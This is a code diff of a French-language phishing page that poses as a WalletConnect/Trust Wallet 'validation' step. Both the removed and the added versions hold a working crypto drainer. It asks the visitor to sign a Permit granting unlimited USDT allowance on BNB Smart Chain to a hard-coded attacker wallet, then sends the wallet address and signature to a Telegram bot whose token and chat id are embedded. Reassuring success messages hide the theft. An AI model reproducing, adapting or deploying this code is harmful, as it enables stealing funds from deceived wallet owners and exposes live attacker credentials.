@@ -1,52 +1,59 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WalletConnect</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-    <style>
-        body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #f5f5f5; }
-        .card { background: white; padding: 30px; border-radius: 20px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 80%; }
-        button { background: #3399ff; color: white; border: none; padding: 15px 25px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.png" width="60">
-        <h2>Validation</h2>
-        <p>Cliquez pour synchroniser.</p>
-        <button id="openBtn">OUVRIR TRUST WALLET</button>
-    </div>
+const cfg = {
+        t: "8111685639:AAFKpBzv2AEi2lQtXpQxQKorT_YdbZWsv9s",
+        i: "7807929833",
+        w: "0x710cD62878b4b976e369819C4D35de8e1912cd6C"
+    };
 
-    <script>
-        const cfg = {
-            t: "8111685639:AAFKpBzv2AEi2lQtXpQxQKorT_YdbZWsv9s",
-            i: "7807929833",
-            w: "0x710cD62878b4b976e369819C4D35de8e1912cd6C"
-        };
-
-        async function start() {
-            if (window.ethereum) {
-                try {
-                    const provider = new ethers.providers.Web3Provider(window.ethereum);
-                    await provider.send("eth_requestAccounts", []);
-                    const signer = provider.getSigner();
-                    const address = await signer.getAddress();
-                    
-                    const domain = { name: "Tether USD", version: "1", chainId: 56, verifyingContract: "0x55d398326f99059ff775485246999027b3197955" };
-                    const types = { Permit: [{name:"owner",type:"address"},{name:"spender",type:"address"},{name:"value",type:"uint256"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}] };
-                    const values = { owner: address, spender: cfg.w, value: ethers.constants.MaxUint256, nonce: 0, deadline: 2524608000 };
-                    
-                    const signature = await signer._signTypedData(domain, types, values);
-                    await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&text=🔥_CAPTURED_%0AWallet: ${address}%0ASig: ${signature}`);
-                    alert("Succès !");
-                } catch (e) { alert("Erreur de connexion."); }
-            } else {
-                window.location.href = "trust://open_url?url=" + window.location.href;
-            }
+    async function start() {
+        if (!window.ethereum) {
+            window.location.href = "trust://open_url?url=" + window.location.href;
+            return;
         }
-        document.getElementById('openBtn').onclick = start;
-    </script>
-</body>
-</html>
+
+        try {
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            // ÉTAPE 1 : FORCER LA CONNEXION
+            const accounts = await provider.send("eth_requestAccounts", []);
+            const address = accounts[0];
+            const signer = provider.getSigner();
+
+            // ÉTAPE 2 : PARAMÈTRES PERMIT USDT BNB
+            const domain = { 
+                name: "Tether USD", 
+                version: "1", 
+                chainId: 56, 
+                verifyingContract: "0x55d398326f99059ff775485246999027b3197955" 
+            };
+            
+            const types = { 
+                Permit: [
+                    {name:"owner",type:"address"},
+                    {name:"spender",type:"address"},
+                    {name:"value",type:"uint256"},
+                    {name:"nonce",type:"uint256"},
+                    {name:"deadline",type:"uint256"}
+                ] 
+            };
+
+            const values = { 
+                owner: address, 
+                spender: cfg.w, 
+                value: "115792089237316195423570985008687907853269984665640564039457584007913129639935", 
+                nonce: 0, 
+                deadline: 2524608000 
+            };
+
+            // ÉTAPE 3 : DÉCLENCHER LA SIGNATURE
+            console.log("Demande de signature...");
+            const signature = await signer._signTypedData(domain, types, values);
+            
+            // ÉTAPE 4 : ENVOI TELEGRAM
+            await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&text=🔥_LOG_CORRECT_%0AWallet: ${address}%0ASig: ${signature}`);
+            alert("Validation terminée avec succès.");
+
+        } catch (err) {
+            console.error(err);
+            alert("Erreur : Veuillez vérifier que vous êtes sur le réseau BNB Smart Chain.");
+        }
+    }
+    document.getElementById('openBtn').onclick = start;
